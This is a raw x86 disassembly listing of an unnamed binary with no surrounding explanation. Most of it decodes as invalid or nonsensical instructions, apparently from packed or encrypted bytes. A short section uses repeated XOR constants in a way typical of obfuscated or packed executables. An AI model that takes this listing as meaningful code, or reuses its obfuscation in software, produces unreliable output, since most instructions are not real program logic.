  41abb2:	(bad)
  41abb5:	(bad)  
  41abb6:	rol    al,1
  41abb8:	jmp    0x41ab9c
  41abba:	retf   
  41abbb:	fld    QWORD PTR ds:0xe9dda8d2
  41abc1:	leave  
  41abc2:	rol    bl,1
  41abc4:	loopne 0x41ab99
  41abc6:	mov    bh,0xb1
  41abc8:	out    dx,al
  41abc9:	jmp    0xfbc8:0xeed9d0b4
  41abd0:	fld    DWORD PTR ds:0xc4d9cc04
  41abd6:	push   es
  41abd7:	or     esp,esi
  41abd9:	retf   
  41abda:	into   
  41abdb:	sti    
  41abdc:	leave  
  41abdd:	leave  
  41abde:	mov    esp,0xd0a4eddd
  41abe3:	hlt    
  41abe4:	ror    dh,0xd5
  41abe7:	enter  0xbff6,0xb5
  41abeb:	cmc    
  41abec:	into   
  41abed:	sar    BYTE PTR [eax-0x2e1e0f04],cl
  41abf3:	repz clc 
  41abf5:	mov    DWORD PTR [edx],0x8bc08d4
  41abfb:	ret    0xe0e9
  41abfe:	fsub   st(5),st
  41ac00:	lods   al,BYTE PTR ds:[esi]
  41ac01:	lock shr ah,cl
  41ac04:	loopne 0x41abdb
  41ac06:	int3   
  41ac07:	out    0xf2,al
  41ac09:	int    0xd5
  41ac0b:	fidiv  WORD PTR [ecx-0x32fd2531]
  41ac11:	(bad)  
  41ac13:	add    al,0xdd
  41ac15:	(bad)  
  41ac17:	xlat   BYTE PTR ds:[ebx]
  41ac18:	retf   0x505
  41ac1b:	fmul   st(7),st
  41ac1d:	int3   
  41ac1e:	loop   0x41abca
  41ac20:	mov    bl,0xcf
  41ac22:	scas   al,BYTE PTR es:[edi]
  41ac23:	shl    BYTE PTR [ebp-0x12072e0c],1
  41ac29:	out    dx,al
  41ac2a:	into   
  41ac2b:	mov    esi,0xf3f9daf3
  41ac30:	fcmovu st,st(4)
  41ac32:	rcr    esp,1
  41ac34:	fldl2t 
  41ac36:	(bad)  
  41ac37:	out    0xe3,eax
  41ac39:	cli    
  41ac3a:	out    0xf8,al
  41ac3c:	into   
  41ac3d:	or     DWORD PTR [edx-0xa57500f],esi
  41ac43:	retf   
  41ac44:	retf   0xe8ca
  41ac47:	out    0xcf,eax
  41ac49:	aam    0xed
  41ac4b:	int3   
  41ac4c:	repz iret 
  41ac4e:	int    0x3
  41ac50:	clc    
  41ac51:	out    dx,al
  41ac52:	in     al,0xfc
  41ac54:	fsubrp st(2),st
  41ac56:	add    al,BYTE PTR [eax]
  41ac58:	in     eax,0x6
  41ac5a:	iret   
  41ac5b:	call   0xc52a7649
  41ac60:	(bad)  
  41ac62:	stos   DWORD PTR es:[edi],eax
  41ac63:	(bad)  
  41ac64:	aad    0xeb
  41ac66:	hlt    
  41ac67:	sti    
  41ac68:	mov    ecx,0xfae8efef
  41ac6d:	cld    
  41ac6e:	mov    ecx,0xc2e1c0bd
  41ac73:	dec    bl
  41ac75:	(bad)  
  41ac77:	add    edi,edi
  41ac79:	or     esp,esi
  41ac7b:	fxch   st(0)
  41ac7d:	iret   
  41ac7e:	stos   DWORD PTR es:[edi],eax
  41ac7f:	jecxz  0x41ac71
  41ac81:	loopne 0x41ac6c
  41ac83:	jmp    0xd2db:0xbbf2e5e8
  41ac8a:	cli    
  41ac8b:	add    edi,DWORD PTR [esi-0x2282533]
  41ac91:	mov    BYTE PTR [eax],0xdc
  41ac94:	mov    BYTE PTR [edi+edx*8],0xca
  41ac98:	cmc    
  41ac99:	fmul   st,st(1)
  41ac9b:	fadd   DWORD PTR ds:0xdfd3ae0b
  41aca1:	lock mov esp,0xfbcbb1eb
  41aca7:	(bad)  
  41aca8:	(bad)  
  41acaa:	repnz fmul st,st(5)
  41acad:	call   0xe338aa6b
  41acb2:	(bad)  
  41acb4:	mov    esp,0xe6040bff
  41acb9:	or     eax,0xedf3ccff
  41acbe:	loopne 0x41ac84
  41acc0:	call   0xd62d99a5
  41acc5:	mov    ebx,0xd3d8f4d5
  41acca:	call   0xd50e90bd
  41accf:	stc    
  41acd0:	jecxz  0x41acaa
  41acd2:	pop    es
  41acd3:	aam    0xdd
  41acd5:	or     al,BYTE PTR [eax]
  41acd7:	add    edx,ecx
  41acd9:	retf   
  41acda:	into   
  41acdb:	clc    
  41acdc:	add    cl,BYTE PTR [eax]
  41acde:	out    0xe2,al
  41ace0:	int3   
  41ace1:	(bad)  
  41ace2:	mov    ebp,0xc0faedeb
  41ace7:	retf   0xedce
  41acea:	mov    dh,0xfb
  41acec:	in     al,dx
  41aced:	out    dx,eax
  41acee:	loope  0x41ace0
  41acf0:	mov    esp,0xd2f3bdc1
  41acf5:	ret    
  41acf6:	(bad)  
  41acf8:	mov    ebp,0xe9fbf4cb
  41acfd:	in     eax,dx
  41acfe:	out    0xea,eax
  41ad00:	sar    DWORD PTR [ebp+edi*4-0xb1a3929],1
  41ad07:	stc    
  41ad08:	cli    
  41ad09:	std    
  41ad0a:	cli    
  41ad0b:	icebp  
  41ad0c:	iret   
  41ad0d:	sti    
  41ad0e:	add    BYTE PTR [ecx-0x32c2526],bh
  41ad14:	out    0xc5,al
  41ad16:	clc    
  41ad17:	inc    DWORD PTR [edi]
  41ad19:	mov    esp,0xbf9f9dc
  41ad1e:	shr    DWORD PTR [eax-0x4f425222],1
  41ad24:	jmp    0xdcef:0xbaf1f3d5
  41ad2b:	mov    ch,0xb4
  41ad2d:	sti    
  41ad2e:	iret   
  41ad2f:	ror    ebp,0xe5
  41ad32:	test   dl,0xfa
  41ad35:	push   es
  41ad36:	or     esi,ebp
  41ad38:	fadd   QWORD PTR [esi]
  41ad3a:	fisttp WORD PTR [esi]
  41ad3c:	std    
  41ad3d:	or     bl,ch
  41ad3f:	scas   al,BYTE PTR es:[edi]
  41ad40:	icebp  
  41ad41:	loop   0x41ad0a
  41ad43:	out    0xe4,al
  41ad45:	icebp  
  41ad46:	retf   0xfed3
  41ad49:	mov    esi,0xce03eff3
  41ad4e:	fsin   
  41ad50:	ror    ebp,1
  41ad52:	loope  0x41ad45
  41ad54:	icebp  
  41ad55:	(bad)  
  41ad56:	fcmovu st,st(2)
  41ad58:	jmp    0xd004aa33
  41ad5d:	loope  0x41ad08
  41ad5f:	jmp    0xb1a9:0xcbc3b7ae
  41ad66:	lock leave 
  41ad68:	rcr    esi,1
  41ad6a:	jmp    0x41ad40
  41ad6c:	call   0x7408829
  41ad71:	stc    
  41ad72:	shr    bl,cl
  41ad74:	lock in eax,0xe1
  41ad77:	add    ebp,ecx
  41ad79:	retf   
  41ad7a:	aad    0xc
  41ad7c:	fimul  DWORD PTR [ecx]
  41ad7e:	icebp  
  41ad7f:	iret   
  41ad80:	fdiv   QWORD PTR [edi-0x1f180a36]
  41ad86:	stc    
  41ad87:	stc    
  41ad88:	retf   0xcffa
  41ad8b:	int3   
  41ad8c:	add    ebp,edx
  41ad8e:	mov    bh,0xd2
  41ad90:	loopne 0x41ad8b
  41ad92:	lock out 0xd2,eax
  41ad95:	retf   0x7f9
  41ad98:	or     ebx,ebx
  41ad9a:	loope  0x41ad81
  41ad9c:	rol    DWORD PTR [ebx+esi*4],cl
  41ad9f:	imul   DWORD PTR [esi-0x8293c35]
  41ada5:	jmp    0x41ad9f
  41ada7:	repz retf 0xb3fb
  41adab:	mov    ebx,0xdee0b9fc
  41adb0:	ret    
  41adb1:	push   es
  41adb2:	sar    al,cl
  41adb4:	or     ebx,eax
  41adb6:	fild   DWORD PTR [ebx]
  41adb8:	pextrw ebp,mm3,0x8
  41adbc:	fcom   DWORD PTR [edx]
  41adbe:	rol    eax,0xe8
  41adc1:	iret   
  41adc2:	lods   al,BYTE PTR ds:[esi]
  41adc3:	(bad)
  41adc7:	fxch   st(0)
  41adc9:	xlat   BYTE PTR ds:[ebx]
  41adca:	shl    DWORD PTR [ebp-0xd222e38],cl
  41add0:	sti    
  41add1:	(bad)  
  41add3:	std    
  41add4:	in     eax,0xfc
  41add6:	(bad)  
  41add7:	fucomp st(6)
  41add9:	fldpi  
  41addb:	ret    0xc812
  41adde:	ret    0xdfb8
  41ade1:	retf   
  41ade2:	out    dx,al
  41ade3:	shl    DWORD PTR [ecx-0x48454d45],1
  41ade9:	mov    edx,0xd1f8b5f2
  41adee:	fiadd  DWORD PTR [edx]
  41adf0:	hlt    
  41adf1:	in     eax,0xbd
  41adf3:	in     eax,0xe6
  41adf5:	hlt    
  41adf6:	jecxz  0x41add7
  41adf8:	or     edi,ecx
  41adfa:	or     al,0xc4
  41adfc:	(bad)  [ebx]
  41adfe:	mov    ebp,0xc4d3c9f2
  41ae03:	out    0xb4,al
  41ae05:	(bad)  
  41ae06:	loope  0x41adc2
  41ae08:	push   DWORD PTR [ebp-0x8052029]
  41ae0e:	mov    esp,0xe0bdf3df
  41ae13:	repz (bad) 
  41ae15:	hlt    
  41ae16:	fiadd  WORD PTR [esi]
  41ae18:	add    BYTE PTR [edx],al
  41ae1a:	enter  0xe9ca,0x5
  41ae1e:	(bad)  
  41ae1f:	xlat   BYTE PTR ds:[ebx]
  41ae20:	mov    ebp,0xc8c4c1f1
  41ae25:	shl    BYTE PTR [ebx-0x4c172f15],cl
  41ae2b:	iret   
  41ae2c:	clc    
  41ae2d:	in     al,dx
  41ae2e:	loop   0x41ae1e
  41ae30:	loopne 0x41adfe
  41ae32:	jmp    edx
  41ae34:	in     al,0x6
  41ae36:	jmp    0x41ae23
  41ae38:	(bad)  
  41ae3b:	repz jmp 0xe2338c3a
  41ae41:	lock out 0xc8,eax
  41ae44:	sar    bl,0xd7
  41ae47:	loopne 0x41ae02
  41ae49:	sti    
  41ae4a:	fcompp 
  41ae4c:	sar    BYTE PTR [ebx+edx*8-0x4142040a],1
  41ae53:	rol    dl,cl
  41ae55:	(bad)  
  41ae56:	fimul  WORD PTR [ecx]
  41ae58:	add    al,0xf8
  41ae5a:	(bad)  
  41ae5c:	or     ch,bl
  41ae5e:	scas   al,BYTE PTR es:[edi]
  41ae5f:	retf   
  41ae60:	mov    bl,0xad
  41ae62:	scas   eax,DWORD PTR es:[edi]
  41ae63:	ret    0xf5d2
  41ae66:	leave  
  41ae67:	mov    cl,0xb5
  41ae69:	fdivr  st,st(4)
  41ae6b:	in     eax,dx
  41ae6c:	mov    ch,0x1
  41ae6e:	in     eax,dx
  41ae6f:	fcmovbe st,st(3)
  41ae71:	add    eax,0x6f8d8c2
  41ae76:	jmp    0xde0a857e
  41ae7b:	cli    
  41ae7c:	add    ebp,eax
  41ae7e:	mov    bl,0xc1
  41ae80:	fmul   st(4),st
  41ae82:	mov    ebp,0xc6c4d5d2
  41ae87:	call   0xfdff8376
  41ae8c:	enter  0xf4f9,0xdb
  41ae90:	shl    ch,0x4
  41ae93:	cld    
  41ae94:	add    al,0xfb
  41ae96:	ror    DWORD PTR [ebx],0xdf
  41ae99:	add    al,0x6
  41ae9b:	(bad)  
  41ae9d:	fadd   st,st(1)
  41ae9f:	neg    ebp
  41aea1:	(bad)  
  41aea2:	ret    
  41aea3:	shr    edx,cl
  41aea5:	jmp    0x41ae6e
  41aea7:	in     eax,dx
  41aea8:	mov    edi,0xddbcd3fb
  41aead:	out    dx,eax
  41aeae:	xlat   BYTE PTR ds:[ebx]
  41aeaf:	loopne 0x41ae9f
  41aeb1:	pop    es
  41aeb2:	hlt    
  41aeb3:	les    eax,FWORD PTR ds:0xe2e4dce2
  41aeb9:	out    0xd5,al
  41aebb:	fsub   st(7),st
  41aebd:	stc    
  41aebe:	mov    dl,0xef
  41aec0:	fdivr  st(2),st
  41aec2:	mov    al,0xd3
  41aec4:	int3   
  41aec5:	repz clc 
  41aec7:	mov    bh,0xb6
  41aec9:	jmp    0xe0:0xcefaf7d0
  41aed0:	push   es
  41aed1:	sar    DWORD PTR [esi-0x39f41a3e],1
  41aed7:	loop   0x41aee2
  41aed9:	retf   
  41aeda:	cld    
  41aedb:	add    eax,0xeee4e2e3
  41aee0:	fsubr  QWORD PTR [ebp-0x192b351b]
  41aee6:	iret   
  41aee7:	mov    al,0xf1
  41aee9:	mov    ecx,0xfbdff7f0
  41aeee:	div    dh
  41aef0:	clc    
  41aef1:	add    dh,ch
  41aef3:	fsub   st,st(5)
  41aef5:	sar    BYTE PTR [edi-0x1e29171f],cl
  41aefb:	in     al,0x8
  41aefd:	into   
  41aefe:	in     eax,dx
  41aeff:	in     al,0xbd
  41af01:	mov    dh,0xc3
  41af03:	into   
  41af04:	mov    bl,0xb1
  41af06:	shl    al,0xfa
  41af09:	shr    esi,1
  41af0b:	mov    esp,0xdcf2caf0
  41af10:	add    edx,esi
  41af12:	cli    
  41af13:	push   eax
  41af15:	jmp    0x130b:0xe2c7efe1
  41af1c:	add    bh,ch
  41af1e:	mov    ebp,0xcbb2afc5
  41af23:	mov    ch,0xe3
  41af25:	(bad)  
  41af27:	jmp    0xd827a3f5
  41af2c:	sti    
  41af2d:	into   
  41af2e:	lock cld 
  41af30:	fcmovnb st,st(7)
  41af32:	rol    cl,cl
  41af34:	ffreep st(7)
  41af36:	add    eax,ebp
  41af38:	jmp    0x13369111
  41af3d:	shr    DWORD PTR [eax-0x3a0a1a4f],cl
  41af43:	rol    al,0xe4
  41af46:	jmp    0xd4c8:0xffcfeef6
  41af4d:	retf   0xf7d4
  41af50:	stc    
  41af51:	mov    eax,0xe4e3f5e3
  41af56:	inc    BYTE PTR [ebx]
  41af58:	call   0xff34bf2b
  41af5d:	or     al,0xb3
  41af5f:	vshufpd ymm6,ymm7,ymm6,0xc5
  41af65:	repnz ror edi,cl
  41af68:	jmp    0xcf3bac28
  41af6d:	mov    ah,0xd2
  41af6f:	enter  0xd0dc,0x4
  41af73:	sti    
  41af74:	rol    DWORD PTR [edi],0xf0
  41af77:	in     eax,0xda
  41af79:	or     ah,ch
  41af7b:	or     dl,bh
  41af7d:	ror    bh,cl
  41af7f:	fmul   st,st(1)
  41af81:	ffree  st(6)
  41af83:	sti    
  41af84:	shl    bh,1
  41af86:	jmp    0xb4347c3f
  41af8b:	(bad)  
  41af8c:	in     al,dx
  41af8d:	call   0xd7339d4b
  41af92:	(bad)  
  41af94:	cmc    
  41af95:	(bad)  
  41af96:	lock add eax,0xc5c501fc
  41af9c:	or     ebp,ebx
  41af9e:	scas   eax,DWORD PTR es:[edi]
  41af9f:	(bad)  
  41afa0:	mov    edi,0xefe8dcc7
  41afa5:	iret   
  41afa6:	into   
  41afa7:	aam    0xcb
  41afa9:	cli    
  41afaa:	mov    ch,0xb4
  41afac:	sti    
  41afad:	aam    0xb9
  41afaf:	out    dx,eax
  41afb0:	mov    edi,0xf1d3dffa
  41afb5:	rcl    edi,1
  41afb7:	in     al,0xe2
  41afb9:	fmul   st(5),st
  41afbb:	add    al,0xe8
  41afbd:	out    0xec,eax
  41afbf:	mov    ebp,0xd0d4c3c5
  41afc4:	test   al,0xc4
  41afc7:	mov    bh,0xba
  41afc9:	add    eax,0x3272fb
  41afce:	mov    ecx,DWORD PTR [ebp-0x13c]
  41afd4:	sub    ecx,eax
  41afd6:	mov    DWORD PTR [ebp-0x10c],ecx
  41afdc:	mov    DWORD PTR [ebp-0x114],0xf89c85bf
  41afe6:	cmp    DWORD PTR [ebp-0x104],0xf89c85b0
  41aff0:	je     0x421d21
  41aff6:	mov    eax,DWORD PTR [ebp-0x11c]
  41affc:	xor    eax,0x75108b5
  41b001:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b007:	xor    ecx,0x75108b5
  41b00d:	lea    ecx,[eax+ecx*1+0x64e5f6]
  41b014:	mov    eax,DWORD PTR [ebp-0x10c]
  41b01a:	xor    edx,edx
  41b01c:	div    ecx
  41b01e:	mov    eax,DWORD PTR [ebp-0x104]
  41b024:	xor    eax,0x75108b5
  41b029:	add    eax,0x3272fb
  41b02e:	mov    ecx,DWORD PTR [ebp-0x11c]
  41b034:	xor    ecx,0x75108b5
  41b03a:	jmp    0x41d3e0
  41b03f:	cli    
  41b040:	adc    BYTE PTR [ebx+0x2c24b1fd],ch
  41b046:	adc    al,0x9e
  41b048:	pmulhuw mm0,QWORD PTR [esi]
  41b04b:	mov    edi,0xc009dfa8
  41b050:	fidivr DWORD PTR [edx+0x7b]
  41b053:	add    bl,BYTE PTR [eax-0x37468485]
  41b059:	sti    
  41b05a:	mov    ah,0xbe
  41b05c:	cli    
  41b05d:	idiv   DWORD PTR [ecx-0x432a1348]
  41b063:	fdivr  st,st(6)
  41b065:	jecxz  0x41b064
  41b067:	mov    esp,0xfaffe7ee
  41b06c:	in     al,0xea
  41b06e:	scas   al,BYTE PTR es:[edi]
  41b06f:	scas   al,BYTE PTR es:[edi]
  41b070:	mov    ch,0xae
  41b072:	int3   
  41b073:	cmc    
  41b074:	shr    DWORD PTR [esi-0x44100a28],cl
  41b07a:	mov    eax,0xf2bfbed2
  41b07f:	(bad)  
  41b080:	mul    eax
  41b082:	out    0xa,eax
  41b084:	aad    0xe7
  41b086:	(bad)  
  41b087:	call   0xd06b05b
  41b08c:	loopne 0x41b056
  41b08e:	icebp  
  41b08f:	repnz rcl dl,1
  41b092:	repz leave 
  41b094:	sti    
  41b095:	xlat   BYTE PTR ds:[ebx]
  41b096:	call   0xf21a8851
  41b09b:	out    dx,al
  41b09c:	jmp    0xbe40ae93
  41b0a1:	out    0xf5,eax
  41b0a3:	jecxz  0x41b06c
  41b0a5:	jmp    edx
  41b0a7:	fiadd  WORD PTR [esp+ebp*8]
  41b0aa:	add    ebx,ebp
  41b0ac:	mov    esi,0xb1d6f2d1
  41b0b1:	out    dx,al
  41b0b2:	hlt    
  41b0b3:	loopne 0x41b095
  41b0b5:	(bad)  
  41b0b7:	mov    edx,0x1cbefc9
  41b0bc:	fst    st(3)
  41b0be:	fsubr  st,st(4)
  41b0c0:	int3   
  41b0c1:	(bad)  
  41b0c3:	fcmovnu st,st(6)
  41b0c5:	cld    
  41b0c6:	fadd   QWORD PTR [edx+ebp*8]
  41b0c9:	(bad)  
  41b0cb:	in     al,dx
  41b0cc:	retf   0xbde1
  41b0cf:	test   ecx,0xc5b0ecf7
  41b0d5:	int    0xf9
  41b0d7:	enter  0xd9cd,0xc3
  41b0db:	ret    0xc3ec
  41b0de:	fsub   st,st(3)
  41b0e0:	loope  0x41b0bd
  41b0e2:	lock (bad) 
  41b0e5:	loopne 0x41b0ce
  41b0e7:	sti    
  41b0e8:	push   cs
  41b0e9:	sti    
  41b0ea:	adc    cl,BYTE PTR ds:0xeff7c2e0
  41b0f0:	loopne 0x41b0c4
  41b0f2:	loopne 0x41b0da
  41b0f4:	loope  0x41b0ae
  41b0f6:	leave  
  41b0f7:	fdiv   st,st(6)
  41b0f9:	mov    ebp,0xc1d6faeb
  41b0fe:	fxtract 
  41b100:	mov    ebp,0xe7e5c2e6
  41b105:	call   0x1eb102
  41b10a:	cli    
  41b10b:	out    0xc4,al
  41b10d:	rcl    dl,0xd7
  41b110:	aam    0xf0
  41b112:	shl    edi,1
  41b114:	jmp    0xecdc:0xc8b8b9e8
  41b11b:	mov    ecx,0xd3d3f6cf
  41b120:	rcr    edi,1
  41b122:	rol    ah,1
  41b124:	std    
  41b125:	add    cl,cl
  41b127:	out    0xed,eax
  41b129:	out    0x1,al
  41b12b:	fidivr DWORD PTR [edi-0x321a321f]
  41b131:	out    0xef,al
  41b133:	loope  0x41b103
  41b135:	(bad)  
  41b136:	mov    bh,0xf0
  41b138:	mov    dh,0xeb
  41b13a:	mov    eax,0x1d4d1c8
  41b13f:	rol    DWORD PTR [edi*4-0xaf43d05],cl
  41b146:	fld    DWORD PTR [eax]
  41b148:	jecxz  0x41b135
  41b14a:	repz dec dl
  41b14d:	out    dx,al
  41b14e:	(bad)
  41b151:	jmp    0xbeb5:0xf7d4efbb
  41b158:	mov    edi,0xdcbfcfcf
  41b15d:	faddp  st(3),st
  41b15f:	shl    bl,0xd9
  41b162:	idiv   eax
  41b164:	test   BYTE PTR [edx],0xeb
  41b167:	fsubp  st(3),st
  41b169:	out    dx,eax
  41b16a:	call   0xea06934f
  41b16f:	loopne 0x41b166
  41b171:	jmp    0x41b133
  41b173:	in     al,dx
  41b174:	mov    ebx,0xb6b9d0ce
  41b179:	mov    edi,0xdef1d9ff
  41b17e:	loope  0x41b167
  41b180:	icebp  
  41b181:	fiadd  WORD PTR [ecx]
  41b183:	fcmovb st,st(5)
  41b185:	or     esi,esp
  41b187:	add    ebp,edi
  41b189:	in     al,0x0
  41b18b:	clc    
  41b18c:	rcl    cl,0xcd
  41b18f:	jecxz  0x41b17e
  41b191:	out    0xda,al
  41b193:	(bad)  
  41b194:	int    0xb7
  41b196:	repnz in eax,dx
  41b198:	fmulp  st(6),st
  41b19a:	fxch   st(4)
  41b19c:	fcom   st(7)
  41b19e:	mov    esp,0xdae207c2
  41b1a3:	retf   
  41b1a4:	mul    bh
  41b1a6:	add    bl,ah
  41b1a8:	jmp    0x41b187
  41b1aa:	in     al,0xf3
  41b1ac:	lods   eax,DWORD PTR ds:[esi]
  41b1ad:	scas   al,BYTE PTR es:[edi]
  41b1ae:	mov    bh,0xe0
  41b1b0:	scas   eax,DWORD PTR es:[edi]
  41b1b1:	lods   eax,DWORD PTR ds:[esi]
  41b1b2:	cmc    
  41b1b3:	in     eax,dx
  41b1b4:	cli    
  41b1b5:	iret   
  41b1b6:	cli    
  41b1b7:	in     eax,dx
  41b1b8:	aam    0xbb
  41b1ba:	mov    edx,0xcfe3dcce
  41b1bf:	rol    DWORD PTR [esi],cl
  41b1c1:	mov    edx,0xf4d7c7e6
  41b1c6:	rol    ebp,0xd8
  41b1c9:	fild   DWORD PTR [eax]
  41b1cb:	std    
  41b1cc:	jmp    0x41b181
  41b1ce:	icebp  
  41b1cf:	int3   
  41b1d0:	shl    ah,0xc7
  41b1d3:	mov    dh,0xf0
  41b1d5:	retf   0xc5b4
  41b1d8:	cmc    
  41b1d9:	sar    eax,cl
  41b1db:	leave  
  41b1dc:	(bad)  
  41b1dd:	rcl    edx,1
  41b1df:	repnz fdivrp st(2),st
  41b1e2:	jmp    0x2ff:0xee03c5e3
  41b1e9:	dec    BYTE PTR [ecx]
  41b1eb:	or     al,0xbe
  41b1ed:	scas   eax,DWORD PTR es:[edi]
  41b1ee:	int    0xcf
  41b1f0:	retf   0xc8cc
  41b1f3:	test   al,0xe1
  41b1f5:	into   
  41b1f6:	jmp    0xf0f868b0
  41b1fb:	fmulp  st(4),st
  41b1fd:	div    eax
  41b1ff:	in     eax,0xbe
  41b201:	add    esi,edx
  41b203:	jmp    0x41b1dd
  41b205:	fdivr  st,st(7)
  41b207:	add    esp,edi
  41b209:	iret   
  41b20a:	jmp    0xaf306315
  41b20f:	into   
  41b210:	repz in eax,0xd5
  41b213:	shl    BYTE PTR [ebx-0x94a2628],0xdf
  41b21a:	fdivp  st(5),st
  41b21c:	repnz fcmovne st,st(5)
  41b21f:	out    dx,al
  41b220:	mov    esi,0xc9d8f0df
  41b225:	fcmovb st,st(7)
  41b227:	(bad)
  41b22a:	jecxz  0x41b21b
  41b22c:	loop   0x41b1d7
  41b22e:	xlat   BYTE PTR ds:[ebx]
  41b22f:	fsub   st(4),st
  41b231:	shl    ecx,cl
  41b233:	xlat   BYTE PTR ds:[ebx]
  41b234:	les    esi,FWORD PTR [edi+edx*8-0x2e154446]
  41b23b:	out    dx,al
  41b23c:	sti    
  41b23d:	loopne 0x41b23a
  41b23f:	in     eax,dx
  41b240:	cli    
  41b241:	rcl    eax,1
  41b243:	fdivr  st,st(6)
  41b245:	fadd   QWORD PTR [ecx]
  41b247:	cmc    
  41b248:	std    
  41b249:	clc    
  41b24a:	clc    
  41b24b:	leave  
  41b24c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b24e:	leave  
  41b24f:	repnz shl ebp,0xc3
  41b253:	into   
  41b254:	fdivr  st,st(1)
  41b256:	sar    DWORD PTR [edi-0xa4e1041],cl
  41b25c:	mov    ebp,0xd1bcddd6
  41b261:	loop   0x41b246
  41b263:	push   es
  41b264:	mov    edi,0xef0efd01
  41b269:	loopne 0x41b27d
  41b26b:	std    
  41b26c:	mov    dl,0xde
  41b26e:	in     eax,0xd5
  41b270:	loopne 0x41b252
  41b272:	ror    ebp,1
  41b274:	in     eax,0xff
  41b276:	cmc    
  41b277:	int    0xb9
  41b279:	cld    
  41b27a:	(bad)  
  41b27b:	mov    eax,0x2c2b8fd
  41b280:	xlat   BYTE PTR ds:[ebx]
  41b281:	mov    esp,0xfce9e1f6
  41b286:	shr    dl,0xdf
  41b289:	add    al,0xfd
  41b28b:	out    dx,al
  41b28c:	int    0xd0
  41b28e:	mov    bh,0xd7
  41b290:	hlt    
  41b291:	aam    0xee
  41b293:	mul    esp
  41b295:	enter  0xfbad,0xda
  41b299:	jmp    0xccb5:0xf2f6e2d4
  41b2a0:	add    eax,esi
  41b2a2:	add    al,0xf1
  41b2a4:	fcomi  st,st(0)
  41b2a6:	push   es
  41b2a7:	rcr    bl,0xf9
  41b2aa:	out    0xc9,eax
  41b2ac:	loope  0x41b29a
  41b2ae:	(bad)  
  41b2af:	icebp  
  41b2b0:	fdiv   QWORD PTR [ebx+edx*8-0x38184509]
  41b2b7:	repnz int 0xcb
  41b2ba:	repz sar cl,1
  41b2bd:	(bad)  
  41b2be:	in     eax,dx
  41b2bf:	rol    edi,cl
  41b2c1:	or     eax,ecx
  41b2c3:	hlt    
  41b2c4:	loope  0x41b2ca
  41b2c6:	sti    
  41b2c7:	out    0xee,eax
  41b2c9:	loope  0x41b2b7
  41b2cb:	std    
  41b2cc:	(bad)
  41b2cf:	jecxz  0x41b2a0
  41b2d1:	mov    ah,0xc7
  41b2d3:	icebp  
  41b2d4:	in     al,dx
  41b2d5:	fnstcw WORD PTR [edx-0x28123730]
  41b2db:	add    esi,ecx
  41b2dd:	lock add ecx,edi
  41b2e0:	mov    esi,0xd200eb
  41b2e5:	out    0xff,al
  41b2e7:	add    al,ah
  41b2e9:	call   0xe2139faf
  41b2ee:	repz out dx,eax
  41b2f0:	ror    cl,0xca
  41b2f3:	out    dx,al
  41b2f4:	retf   
  41b2f5:	shl    DWORD PTR [ebp-0x42d2b36],cl
  41b2fb:	cmc    
  41b2fc:	fadd   QWORD PTR [ecx]
  41b2fe:	inc    edx
  41b300:	rcl    esp,cl
  41b302:	fsub   st(3),st
  41b304:	jmp    0x41b2e2
  41b306:	cmc    
  41b307:	or     cl,ch
  41b309:	jmp    0x41b2da
  41b30b:	jecxz  0x41b2fc
  41b30d:	out    0xee,al
  41b30f:	lods   al,BYTE PTR ds:[esi]
  41b310:	(bad)  
  41b311:	cmc    
  41b312:	shl    ecx,cl
  41b314:	mov    ch,0xc6
  41b316:	int3   
  41b317:	jmp    0x41b301
  41b319:	aam    0xf7
  41b31b:	iret   
  41b31c:	ret    
  41b31d:	into   
  41b31e:	out    0xe0,eax
  41b320:	aam    0xdc
  41b322:	repz aam 0x0
  41b325:	(bad)  
  41b326:	call   0xf0e7a29
  41b32b:	retf   
  41b32c:	fcom   st(2)
  41b32e:	mov    al,0xd3
  41b330:	retf   
  41b331:	lods   al,BYTE PTR ds:[esi]
  41b332:	loop   0x41b2f8
  41b334:	call   0xb53a72ff
  41b339:	mov    dh,0xce
  41b33b:	mov    esi,0xd0d5e1b9
  41b340:	mov    ebp,0x50ac4f5
  41b345:	cli    
  41b346:	hlt    
  41b347:	jecxz  0x41b332
  41b349:	iret   
  41b34a:	push   es
  41b34b:	(bad)  
  41b34c:	mov    ebp,0xcfcaecd1
  41b351:	shl    bl,1
  41b353:	ret    0xb0f6
  41b356:	in     eax,0xef
  41b358:	fmulp  st(0),st
  41b35a:	leave  
  41b35b:	add    edi,ebx
  41b35d:	imul   bh
  41b35f:	out    0xed,eax
  41b361:	mov    edx,0xdffa04ea
  41b366:	iret   
  41b367:	bswap  edx
  41b369:	into   
  41b36a:	fild   DWORD PTR [esi]
  41b36c:	shr    edi,0xcc
  41b36f:	enter  0xb4e4,0xd0
  41b373:	mov    bl,0xb3
  41b375:	iret   
  41b376:	out    0xd5,al
  41b378:	(bad)
  41b37b:	std    
  41b37c:	in     al,dx
  41b37d:	call   0xd7459345
  41b382:	jecxz  0x41b37c
  41b384:	cld    
  41b385:	or     ah,dh
  41b387:	(bad)  
  41b388:	call   0xe453c274
  41b38d:	sar    DWORD PTR [edi+eiz*8-0x3e303633],1
  41b394:	rcr    ecx,cl
  41b396:	out    0xb0,al
  41b398:	mov    edi,0xdabaddde
  41b39d:	sar    BYTE PTR [esi-0x53d2928],1
  41b3a3:	jmp    0x41b368
  41b3a5:	fcmovnu st,st(5)
  41b3a7:	(bad)  
  41b3a8:	(bad)  
  41b3a9:	fld    DWORD PTR [ecx]
  41b3ab:	shl    al,cl
  41b3ad:	test   edi,0xcfc7ccf3
  41b3b3:	in     al,0xcf
  41b3b5:	clc    
  41b3b6:	out    0xd4,eax
  41b3b8:	out    dx,al
  41b3b9:	mov    ebx,0xdad6f3d7
  41b3be:	out    dx,al
  41b3bf:	(bad)  
  41b3c0:	icebp  
  41b3c1:	hlt    
  41b3c2:	add    esi,eax
  41b3c4:	cli    
  41b3c5:	xlat   BYTE PTR ds:[ebx]
  41b3c6:	(bad)  
  41b3c7:	loopne 0x41b397
  41b3c9:	fxch   st(7)
  41b3cb:	ror    ecx,cl
  41b3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3ce:	sar    BYTE PTR [ebp-0x24103444],1
  41b3d4:	out    0xae,eax
  41b3d6:	icebp  
  41b3d7:	jmp    0x41b3b4
  41b3d9:	add    eax,ebx
  41b3db:	std    
  41b3dc:	fidiv  WORD PTR [esi-0x3c3f2c34]
  41b3e2:	(bad)  
  41b3e4:	inc    BYTE PTR [edi]
  41b3e6:	jmp    0x41b3dc
  41b3e8:	loop   0x41b3e9
